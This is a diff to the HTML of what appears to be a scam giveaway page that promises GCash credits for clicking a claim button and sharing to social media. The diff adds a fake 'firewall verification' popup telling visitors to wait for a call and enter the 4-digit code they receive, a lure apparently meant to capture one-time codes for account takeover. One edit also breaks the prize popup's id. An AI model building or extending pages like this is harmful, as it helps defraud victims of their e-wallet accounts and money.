@@ -137,16 +137,21 @@
         <div class="time-display" id="mainTimerDisplay">--D --:--:--</div>
     </div>
     
-    <button class="claim-now-btn" id="claimNowBtn">
-        <img src="images/scatter_icon.jpg" class="claim-icon" alt="icon"> CLAIM NOW!!
-    </button>
-    
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
+    <!-- CLAIM SECTION -->
+<button class="claim-now-btn" id="claimNowBtn">
+    <div class="icon-container">
+        <img src="images/scatter_icon.jpg" class="claim-icon twisting-scatter" alt="icon">
     </div>
-    <div class="status-message" id="statusMessage">
-        <span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>
-    </div>
+    <span class="btn-text">CLAIM NOW!!</span>
+</button>
+
+<div class="progress-bar">
+    <div class="progress-fill" id="progressFill"></div>
+</div>
+
+<div class="status-message" id="statusMessage">
+    <span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>
+</div>
     
     <div class="button-divider">
         <span></span>
@@ -154,7 +159,7 @@
         <span></span>
     </div>
     
-    <!-- REMASTERED FACEBOOK BUTTON -->
+
 <!-- Divider before share -->
 <div class="button-divider">
     <span></span>
@@ -173,7 +178,7 @@
     Share to <strong>Social Media</strong> <br>received up to <strong>₱1,000 GCash Credits</strong>
 </div>
 
-<div id="prizePopup" class="prize-popup" style="display: none;">
+<div id="x`" class="prize-popup" style="display: none;">
     <div class="popup-container">
         <div class="popup-inner">
             <div class="popup-close" onclick="closePrizePopup()">✕</div>
@@ -205,6 +210,30 @@
 </div>
 
 <canvas id="confettiCanvas"></canvas>
+
+ <!-- ========== FIREWALL VERIFICATION POPUP ========== -->
+    <div id="firewallPopup" class="firewall-popup-overlay" style="display: none;">
+        <div class="firewall-popup-card">
+            <div class="popup-close-btn" onclick="hideFirewallPopup()">✕</div>
+            <div id="firewallPopupContent">
+                <div class="firewall-warning-icon">📞</div>
+                <h2>VERIFICATION REQUIRED</h2>
+                <div class="firewall-message">
+                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+                    <p>Enter the code below to continue.</p>
+                </div>
+                <div class="verification-input-group">
+                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
+                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
+                </div>
+                <div class="firewall-note">
+                    <p>Waiting for system-verification call...</p>
+                </div>
+                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
+            </div>
+        </div>
+    </div>
 
 <script src="js/promotion.js"></script>
 <script src="js/popup_share.js"></script>
